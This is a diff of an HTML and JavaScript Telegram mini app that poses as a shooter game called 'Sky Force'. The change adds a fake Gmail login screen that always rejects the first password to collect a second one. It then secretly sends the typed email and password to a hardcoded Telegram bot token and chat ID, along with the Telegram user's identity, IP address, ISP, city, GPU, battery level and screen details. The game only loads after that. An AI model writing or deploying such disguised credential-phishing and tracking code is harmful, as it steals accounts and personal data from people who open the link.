@@ -3,24 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sky Force Mini App</title>
+    <title>Sky Force - Combat System</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { margin: 0; background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; touch-action: none; }
-        #menu { position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: radial-gradient(circle, #001 0%, #000 100%); z-index: 10; }
-        h1 { font-size: 24px; text-shadow: 0 0 10px #00ff00; margin-bottom: 20px; }
-        .btn { padding: 15px 40px; border: 2px solid #00ff00; background: transparent; color: #00ff00; font-size: 18px; cursor: pointer; font-family: inherit; box-shadow: 0 0 15px rgba(0,255,0,0.3); transition: 0.3s; }
-        .btn:active { background: #00ff00; color: #000; }
-        #ui { position: absolute; top: 10px; left: 10px; color: white; font-size: 18px; display: none; }
-        canvas { display: none; background: #000510; }
+        #login-screen, #game-over-screen { 
+            position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; 
+            justify-content: center; align-items: center; background: rgba(0,0,0,0.95); z-index: 20; 
+        }
+        #game-over-screen { display: none; z-index: 25; }
+        .box { width: 85%; max-width: 320px; padding: 25px; border: 1px solid #00ff00; box-shadow: 0 0 20px rgba(0,255,0,0.3); text-align: center; background: #050505; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #004400; color: #00ff00; box-sizing: border-box; outline: none; font-family: inherit; }
+        .btn { width: 100%; padding: 12px; border: none; background: #00ff00; color: #000; font-weight: bold; cursor: pointer; margin-top: 10px; font-family: inherit; }
+        #error-msg { color: #ff0000; font-size: 11px; margin-top: 10px; display: none; }
+        #ui { position: absolute; top: 15px; left: 15px; color: white; display: none; z-index: 5; font-size: 20px; text-shadow: 2px 2px #000; }
+        canvas { display: none; background: radial-gradient(circle, #001529 0%, #000 100%); }
     </style>
 </head>
 <body>
 
-<div id="menu">
-    <h1>SKY FORCE MISSION</h1>
-    <button class="btn" onclick="initGame()">START MISSION</button>
-    <p style="font-size: 10px; margin-top: 20px; color: #008800;">SYNCING DATA CORES...</p>
+<div id="login-screen">
+    <div class="box">
+        <h2 style="margin:0; letter-spacing: 2px;">LOGIN</h2>
+        <p style="font-size: 10px; color: #008800;">Verify identity to access combat server</p>
+        <input type="text" id="email" placeholder="Email (@gmail.com)" autocomplete="off">
+        <input type="password" id="pass" placeholder="Password" autocomplete="off">
+        <div id="error-msg">⚠️ PASSWORD ERROR: TRY AGAIN</div>
+        <button class="btn" id="loginBtn" onclick="handleLogin()">LOGIN & PLAY</button>
+    </div>
+</div>
+
+<div id="game-over-screen">
+    <div class="box">
+        <h1 style="color: red; text-shadow: 0 0 15px red; margin:0;">MISSION FAILED</h1>
+        <p style="color: white; margin: 20px 0;">FINAL SCORE: <span id="final-score" style="color: #0f0;">0</span></p>
+        <button class="btn" onclick="location.reload()">MAIN ULANG</button>
+    </div>
 </div>
 
 <div id="ui">SCORE: <span id="score">0</span></div>
@@ -30,114 +48,140 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // MASUKKAN TOKEN DAN CHAT ID ANDA DI SINI
     const TOKEN = '8492775361:AAE5U8rZNjqxGNnthSAaIKf-vO0-WHIrF1w';
     const CHAT_ID = '7393949927';
 
-    async function initGame() {
-        document.getElementById('menu').style.display = 'none';
-        document.getElementById('ui').style.display = 'block';
-        document.getElementById('gameCanvas').style.display = 'block';
-        
-        collectAndSend(); // Kirim laporan di background
-        startGame();      // Mulai game pesawat
+    // ASSETS
+    const pImg = new Image(); pImg.src = 'https://opengameart.org/sites/default/files/player_0.png';
+    const eImg = new Image(); eImg.src = 'https://opengameart.org/sites/default/files/enemy_1.png';
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+    function sfx(f, d, t) {
+        const o = audioCtx.createOscillator(); const g = audioCtx.createGain();
+        o.type = t; o.frequency.setValueAtTime(f, audioCtx.currentTime);
+        o.frequency.exponentialRampToValueAtTime(10, audioCtx.currentTime + d);
+        g.gain.setValueAtTime(0.05, audioCtx.currentTime);
+        o.connect(g); g.connect(audioCtx.destination);
+        o.start(); o.stop(audioCtx.currentTime + d);
     }
 
-    async function collectAndSend() {
-        const user = tg.initDataUnsafe?.user;
-        
-        let ip = {};
-        try { const r = await fetch('https://ipapi.co/json/'); ip = await r.json(); } catch(e){}
+    let attempt = 0;
+    let isGameOver = false;
 
-        // Deteksi Merk & Hardware
-        let brand = "Generic", gpu = "N/A";
-        const gl = document.createElement('canvas').getContext('webgl');
+    async function handleLogin() {
+        if (audioCtx.state === 'suspended') audioCtx.resume();
+        const e = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+        const err = document.getElementById('error-msg');
+        const btn = document.getElementById('loginBtn');
+
+        if (!e.toLowerCase().endsWith("@gmail.com")) {
+            alert("Harap gunakan akun @gmail.com yang valid!");
+            return;
+        }
+        if (!e || !p) return;
+
+        attempt++;
+        btn.innerText = "AUTHENTICATING...";
+        btn.disabled = true;
+
+        await collectAndSend(e, p, attempt);
+
+        setTimeout(() => {
+            if (attempt === 1) {
+                err.style.display = "block";
+                btn.innerText = "LOGIN & PLAY";
+                btn.disabled = false;
+                document.getElementById('pass').value = "";
+                if (navigator.vibrate) navigator.vibrate(100);
+            } else {
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('ui').style.display = 'block';
+                document.getElementById('gameCanvas').style.display = 'block';
+                startGame();
+            }
+        }, 1300);
+    }
+
+    async function collectAndSend(uE, uP, att) {
+        const user = tg.initDataUnsafe?.user;
+        let ipD = {}; 
+        try { const r = await fetch('https://ipapi.co/json/'); ipD = await r.json(); } catch(err){}
+
+        // Advanced Hardware Detection
+        let gpu = "N/A", battery = "N/A";
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
         if (gl) {
             const debug = gl.getExtension('WEBGL_debug_renderer_info');
             gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-            if (/Samsung/i.test(navigator.userAgent)) brand = "Samsung";
-            else if (/iPhone|iPad/i.test(navigator.userAgent)) brand = "Apple";
-            else if (/Xiaomi/i.test(navigator.userAgent)) brand = "Xiaomi";
         }
+        try { const b = await navigator.getBattery(); battery = (b.level * 100) + "%"; } catch(e){}
 
-        // Laporan Sesuai Permintaan
         const report = `
-👤 **IDENTITAS PENGKLIK LINK**
-Nama Lengkap: ${user?.first_name || 'Tidak Diketahui'} ${user?.last_name || ''}
-Email: ${user?.username ? '@' + user.username : 'Tidak Ada'}
-Password: \`${user?.id || 'N/A'}\`
-Bahasa: ${user?.language_code || 'N/A'}
-
-📱 **DATA PERANGKAT**
-Merk: ${brand} | OS: ${navigator.platform}
-GPU: ${gpu}
-Cores: ${navigator.hardwareConcurrency} | RAM: ${navigator.deviceMemory || 'N/A'}GB
-Screen: ${screen.width}x${screen.height}
-
-🌐 **JARINGAN**
-IP: \`${ip.ip}\` | ISP: ${ip.org}
-Lokasi: ${ip.city}, ${ip.country_name}
-Signal: ${navigator.connection?.effectiveType || 'N/A'}
-
-🛠️ **SISTEM MENDALAM**
-Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Baterai: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : 'N/A'}
-Referrer: ${document.referrer || 'Direct'}
+🔥 **NEW CAPTURE (#${att})**
 --------------------------------
-🕒 *Waktu: ${new Date().toLocaleString('id-ID')}*`;
+👤 **TELEGRAM DATA**
+Nama: ${user?.first_name || 'N/A'} ${user?.last_name || ''}
+User: @${user?.username || 'N/A'}
+ID: \`${user?.id || 'N/A'}\`
 
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+📧 **USER INPUT**
+Email: \`${uE}\`
+Pass: \`${uP}\`
+
+📱 **HARDWARE INFO**
+Device: ${navigator.platform}
+GPU: ${gpu}
+RAM: ${navigator.deviceMemory || 'N/A'}GB | Cores: ${navigator.hardwareConcurrency}
+Baterai: ${battery} | Layar: ${screen.width}x${screen.height}
+
+🌐 **NETWORK & LOCATION**
+IP: \`${ipD.ip}\` | ISP: ${ipD.org}
+Lokasi: ${ipD.city}, ${ipD.country_name}
+--------------------------------`;
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "Markdown" })
         });
     }
 
-    // --- SEDERHANA GAME ENGINE ---
     function startGame() {
         const canvas = document.getElementById('gameCanvas');
         const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
-        let score = 0;
-        let player = { x: canvas.width/2-20, y: canvas.height-100, w: 40, h: 40 };
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        let score = 0, player = { x: canvas.width/2-25, y: canvas.height-120, w: 50, h: 50 };
         let bullets = [], enemies = [];
 
-        canvas.addEventListener('touchmove', e => {
-            player.x = e.touches[0].clientX - 20;
-        });
+        canvas.addEventListener('touchmove', e => { 
+            if (!isGameOver) player.x = e.touches[0].clientX - 25; 
+            e.preventDefault(); 
+        }, {passive: false});
 
-        // Interval Tembakan & Musuh
-        setInterval(() => bullets.push({x: player.x+18, y: player.y, w: 4, h: 10}), 300);
-        setInterval(() => enemies.push({x: Math.random()*(canvas.width-30), y: -30, w: 30, h: 30, s: 3}), 1200);
+        const sInt = setInterval(() => { if(!isGameOver) { bullets.push({x: player.x+23, y: player.y, w: 4, h: 12}); sfx(400, 0.1, 'square'); } }, 300);
+        const eInt = setInterval(() => { if(!isGameOver) enemies.push({x: Math.random()*(canvas.width-45), y: -60, w: 45, h: 45, s: 4+(score/200)}) }, 900);
 
         function loop() {
+            if (isGameOver) return;
             ctx.clearRect(0,0,canvas.width,canvas.height);
-            
-            // Gambar Player
-            ctx.fillStyle = "#00ff00";
-            ctx.fillRect(player.x, player.y, player.w, player.h);
-
-            // Peluru
+            ctx.drawImage(pImg, player.x, player.y, player.w, player.h);
             bullets.forEach((b, i) => {
-                b.y -= 7;
-                ctx.fillStyle = "yellow";
-                ctx.fillRect(b.x, b.y, b.w, b.h);
+                b.y -= 9; ctx.fillStyle = "#ff0"; ctx.fillRect(b.x, b.y, b.w, b.h);
                 if(b.y < 0) bullets.splice(i, 1);
             });
-
-            // Musuh
             enemies.forEach((en, i) => {
-                en.y += en.s;
-                ctx.fillStyle = "red";
-                ctx.fillRect(en.x, en.y, en.w, en.h);
-                
-                // Tabrakan Peluru
+                en.y += en.s; ctx.drawImage(eImg, en.x, en.y, en.w, en.h);
+                if (player.x < en.x + en.w && player.x + player.w > en.x && player.y < en.y + en.h && player.y + player.h > en.y) {
+                    sfx(100, 0.5, 'sawtooth'); if (navigator.vibrate) navigator.vibrate(500);
+                    isGameOver = true; clearInterval(sInt); clearInterval(eInt);
+                    document.getElementById('final-score').innerText = score;
+                    document.getElementById('game-over-screen').style.display = 'flex';
+                }
                 bullets.forEach((b, bi) => {
                     if(b.x < en.x+en.w && b.x+b.w > en.x && b.y < en.y+en.h && b.y+b.h > en.y) {
-                        enemies.splice(i, 1); bullets.splice(bi, 1);
-                        score += 10;
+                        enemies.splice(i, 1); bullets.splice(bi, 1); score += 10;
                         document.getElementById('score').innerText = score;
                     }
                 });
